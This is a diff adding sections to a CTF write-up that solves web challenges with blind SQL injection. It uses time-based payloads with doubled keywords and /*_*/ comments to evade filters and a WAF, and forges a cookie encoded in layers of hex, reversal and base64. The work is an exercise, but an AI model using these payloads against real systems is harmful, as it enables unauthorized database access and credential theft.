@@ -275,3 +275,56 @@ I stared injecting with this payload , I guessed the part of column name 'pass' 
 1'+OR+(selselectect+sleep(10)+frofromm+dual+whewherere+(selselectect+table_name+frfromom information_schema.columns+whwhereere+table_schema=database()+and+column_name+like+'%pass%'+limit+0,1)+like+'%%')%23
 ```
 By guessing &trying I got columns (passwd , uname , role), table (inception_users)
+
+![Screenshot at 2021-07-21 13-01-52](https://user-images.githubusercontent.com/52857059/126554514-25f916b4-f110-4080-8e24-8baefc5f0677.png)
+
+![Screenshot at 2021-07-21 13-02-48](https://user-images.githubusercontent.com/52857059/126554656-6954d967-9149-4d0d-a7ec-5b8d32f4b745.png)
+
+now let's see what is in passwd column by this payload :
+
+```html
+1'+OR+(+SELselectECT+count(*)+frfromom+inception_users+whwhereere+role=+'admin'+AND+passwd+like+'%')%23
+```
+![Screenshot at 2021-07-21 13-05-22](https://user-images.githubusercontent.com/52857059/126555069-c55458f6-55ec-44b5-84b2-78ba3fe1aad4.png)
+
+By guessing &trying I finally got the flag :"D
+![Screenshot at 2021-07-21 13-06-03](https://user-images.githubusercontent.com/52857059/126555257-a0cbdc1e-f163-4621-8688-e77195d6e80d.png)
+
+## 4- BLACKLIST(medium)
+
+![Screenshot at 2021-07-21 15-13-53](https://user-images.githubusercontent.com/52857059/126556113-44fabb06-437f-47ce-b03d-f7244d7590e9.png)
+
+It was the same - inception challenge - But the blacklist was space , i tried (/**/) as space but it was faild .
+
+finally i found (/*_*/) worked as a space without waf caught it :D 
+the same mechanism again ...
+
+![Screenshot at 2021-07-21 15-15-04](https://user-images.githubusercontent.com/52857059/126556433-9d813bfc-f7ab-4658-992a-8c9c74f92d16.png)
+
+By guessing &trying I got column (flag), table (blacklist_users)
+
+now let's see what is in flag column by this payload :
+```html
+1'/*_*/or/*_*/(select/*_*/sleep(10)/*_*/from/*_*/dual/*_*/where/*_*/(select/*_*/flag/*_*/from/*_*/blacklist_users)/*_*/like/*_*/'%')%23
+```
+By guessing &trying I finally got the flag :"D
+
+![Screenshot at 2021-07-21 15-14-22](https://user-images.githubusercontent.com/52857059/126556925-a5f3f320-25a5-4161-b90a-a288d977200f.png)
+
+## 5- BUY THE FLAG(easy)
+
+this challenge depend on decreption let's see it .
+![Screenshot at 2021-07-21 22-41-03](https://user-images.githubusercontent.com/52857059/126557249-e4722ab1-47e7-48fa-ad35-6a9f4eb9d8e9.png)
+
+With a little care we notice that by changing the cookie it returns to the original value so it is sensitive to cookies according to the cookie
+```html
+Cookie:3054505242564F465A55567A59456257644662475647644B5A56597759466255426A57735A315431305756584A6C566A746B567759565531736D5956683261546C58557849474E78306D56
+```
+then by unhexing and reversing and decoding base64 5 times , we will get 
+```html
+User_is_=Fread
+```
+now we have to change value to Us3r & encrept User_is_=Us3r hexing & reversing and encoding base64 5 times
+after that u will get the flag 
+
+![Screenshot at 2021-07-21 16-20-32](https://user-images.githubusercontent.com/52857059/126558141-f3f012a4-3f41-4d53-9791-f88a2961025d.png)
